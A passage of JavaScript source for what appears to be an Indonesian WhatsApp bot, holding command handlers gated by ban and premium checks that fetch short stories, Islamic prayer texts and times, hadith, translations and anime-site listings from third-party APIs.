reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasejati':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`cinta sejati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-galau':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`galau`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-gokil':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`gokil`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-inspiratif':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`inspiratif`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-jepang':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`jepang`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kehidupan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`kehidupan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-keluarga':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`keluarga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kisahnyata':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`kisah nyata`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-korea':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`korea`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kristen':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`kristen`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-liburan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`liburan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-malaysia':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`malaysia`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-mengharukan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`mengharukan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-misteri':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`misteri`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-motivasi':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`motivasi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasihat':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`nasihat`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasionalisme':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`nasionalisme`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-olahraga':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`olahraga`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-patahhati':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`patah hati`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penantian':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`penantian`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pendidikan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`pendidikan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengalaman':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`pengalaman pribadi`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengorbanan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`pengorbanan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penyesalan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`penyesalan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perjuangan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`perjuangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perpisahan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`perpisahan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-persahabatan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`persahabatan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-petualangan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`petualangan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-ramadhan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`ramadhan`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-remaja':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`remaja`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rindu':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`rindu`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rohani':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`rohani`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-romantis':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`romantis`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sastra':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`sastra`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sedih':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`sedih`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sejarah':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
let cerpe = await cerpen(`sejarah`)
reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
kohp = await fetchJson(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
kohz = kohp.result
ini_txt = `Title : ${kohz.title}\n`
ini_txt += `Creator : ${kohz.creator}\n`
ini_txt += `Story :\n${kohz.cerpen}`
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: ini_txt,
footerText: 'Pencet Button Untuk Next',
buttons: buttons,
headerType: 2
}
kirbotz.sendMessage(m.chat, buttonMessage, { quoted: fakekirbotz })
}
break
case 'namapeople':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
kohc = await fetchJson(`https://api.lolhuman.xyz/api/random/people?apikey=${lolkey}`)
kohx = kohc.result
ini_txt = `Nama : ${kohx.name.title} ${kohx.name.first} ${kohx.name.last}\n`
ini_txt += `Gender : ${kohx.gender}\n`
ini_txt += `Location Number : ${kohx.location.street.number}\n`
ini_txt += `Location Name : ${kohx.location.street.name}\n`
ini_txt += `Location City : ${kohx.location.city}\n`
ini_txt += `Location State : ${kohx.location.state}\n`
ini_txt += `Location Country : ${kohx.location.country}\n`
ini_txt += `Location PostCode : ${kohx.location.postcode}\n`
ini_txt += `Location Latitude : ${kohx.location.coordinates.latitude}\n`
ini_txt += `Location Longitude : ${kohx.location.coordinates.longitude}\n`
ini_txt += `Location Timeone : ${kohx.location.timezone.offset}\n`
ini_txt += `Deskripsi : ${kohx.location.timezone.description}\n`
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: ini_txt,
footerText: 'Pencet Button Untuk Next',
buttons: buttons,
headerType: 2
}
kirbotz.sendMessage(m.chat, buttonMessage, { quoted: fakekirbotz })
}
break
case 'niatshalat':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!q) return reply(`Contoh ${prefix+command} isya
List Nya
shubuh
dzuhur
ashar
magribh
isya`)
ysehh = await akira.niatsholat(`${q}`)
reply(`Name : ${ysehh.name}
Arabic : 
${ysehh.arabic}
Latin : 
${ysehh.latin}
Terjemahan: 
${ysehh.terjemahan}`)
break
case 'bacaanshalat':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
dehe = await akira.bacaanshalat()
reply(`Nomor : ${dehe.nomor}
Name : ${dehe.name}
Arabic : ${dehe.arabic}
Latin : ${dehe.latin}
Terjemahan : ${dehe.terjemahan}`)
break
case 'ayatkursi':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
cshh = await ayatKursi()
reply(`Tafsir : ${cshh.tafsir}
Arabic : 
${cshh.arabic}

Latin : 
${cshh.latin}

Translate : 
${cshh.translate}`)
}
break
case 'asmaulhusna': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
kohj = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${lolkey}`)
kghw = kohj.result
ini_txt = `No : ${kghw.index}\n`
ini_txt += `Latin: ${kghw.latin}\n`
ini_txt += `Arab : ${kghw.ar}\n`
ini_txt += `Indonesia : ${kghw.id}\n`
ini_txt += `English : ${kghw.en}`
let buttons = [
{buttonId: `${command}`, buttonText: {displayText: 'Next'}, type: 1}
]
let buttonMessage = {
text: ini_txt,
footerText: 'Pencet Button Untuk Next',
buttons: buttons,
headerType: 2
}
kirbotz.sendMessage(m.chat, buttonMessage, { quoted: fakekirbotz })
}
break
case 'kisahnabi':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} Muhammad`)
query = args.join(" ")
wdwo = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${lolkey}`)
wdwp = wdwo.result
ini_txt = `Name : ${wdwp.name}\n`
ini_txt += `Lahir : ${wdwp.thn_kelahiran}\n`
ini_txt += `Umur : ${wdwp.age}\n`
ini_txt += `Tempat : ${wdwp.place}\n`
ini_txt += `Story : \n${wdwp.story}`
replyNya(ini_txt)
break
case 'jadwalsholat':	
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length == 0) return replyNya(`Example: ${prefix + command} Yogyakarta`)
daerah = args.join(" ")
wdza = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${lolkey}`)
wdzs = wdza.result
ini_txt = `Wilayah : ${wdzs.wilayah}\n`
ini_txt += `Tanggal : ${wdzs.tanggal}\n`
ini_txt += `Sahur : ${wdzs.sahur}\n`
ini_txt += `Imsak : ${wdzs.imsak}\n`
ini_txt += `Subuh : ${wdzs.subuh}\n`
ini_txt += `Terbit : ${wdzs.terbit}\n`
ini_txt += `Dhuha : ${wdzs.dhuha}\n`
ini_txt += `Dzuhur : ${wdzs.dzuhur}\n`
ini_txt += `Ashar : ${wdzs.ashar}\n`
ini_txt += `Maghrib : ${wdzs.imsak}\n`
ini_txt += `Isya : ${wdzs.isya}`
replyNya(ini_txt)
break
case 'listsurah':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
whqg = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${lolkey}`)
whqa = whqg.result
ini_txt = 'List Surah:\n'
for (var x in whqa) {
ini_txt += `${x}. ${whqa[x]}\n`
}
replyNya(ini_txt)
break
case 'iqra': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
if (!text) throw oh
sticWait(from)
yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
kirbotz.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:fakekirbotz}).catch ((err) => reply(oh))
}
break
case 'hadis': case 'hadist': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan Tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
if (!args[1]) throw `Hadis Yang Ke Berapa?\n\nContoh:\n${prefix + command} muslim 1`
try {
let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
let { number, arab, id } = res.find(v => v.number == args[1])
replyNya(`No. ${number}

${arab}

${id}`)
} catch (e) {
replyNya(`Hadis tidak ditemukan !`)
}
}
break
case 'juzamma': {
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args[0] === 'pdf') {
sticWait(from)
kirbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:fakekirbotz})
} else if (args[0] === 'docx') {
sticWait(from)
kirbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:fakekirbotz})
} else if (args[0] === 'pptx') {
sticWait(from)
kirbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:fakekirbotz})
} else if (args[0] === 'xlsx') {
sticWait(from)
kirbotz.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:fakekirbotz})
} else {
replyNya(`Mau Format Apa ? Example : ${prefix + command} pdf

Format Yang Tersedia : pdf, docx, pptx, xlsx`)
}
}
break
case 'translate':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
if (args.length < 1) return reply(`Text Nya Mana Kak?\nContoh\n${prefix + command} Who am I`)
sticWait(from)
tes = await fetchJson(`https://megayaa.herokuapp.com/api/translate?to=id&kata=${q}`)
Infoo = tes.info
Detek = tes.translate
replyNya(`👷Translate : ${Detek}\n🔎Hasil : ${Infoo}`)
break
case 'nekopoisearch':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
              if (args.length == 0) return replyNya(`Example: ${prefix + command} Isekai Harem`)
              query = args.join(" ")
              pqsh = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolkey}&query=${query}`)
              fekfw = pqsh.result
              ini_txt = ""
              for (var x of fekfw) {
              ini_txt += `\`\`\`🐥 Title : ${x.title}\`\`\`\n`
              ini_txt += `\`\`\`🐥 Link : ${x.link}\`\`\`\n`
              ini_txt += `\`\`\`🐥 Thumbnail : ${x.thumbnail}\`\`\`\n\n`
}
              replyNya(ini_txt)
              break
case 'nekopoi':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isPrem) return replyPremium(mess.premium)
              if (args.length == 0) return replyNya(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
              ini_url = args[0]
sticWait(from)
              geof = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${lolkey}&url=${ini_url}`)
              skdl = geof.result
              ini_txt = `\`\`\`🐥 Title : ${skdl.anime}\`\`\`\n`
              ini_txt += `\`\`\`🐥 Porducers : ${skdl.producers}\`\`\`\n`
              ini_txt += `\`\`\`🐥 Duration : ${skdl.duration}\`\`\`\n`
              ini_txt += `\`\`\`🐥 Size : ${skdl.size}\`\`\`\n`
              ini_txt += `\`\`\`🐥 Sinopsis : ${skdl.sinopsis}\`\`\`\n`
              link = skdl.link
              for (var x in link) {
              ini_txt += `\n${link[x].name}\n`
              link_dl = link[x].link
              for (var y in link_dl) {
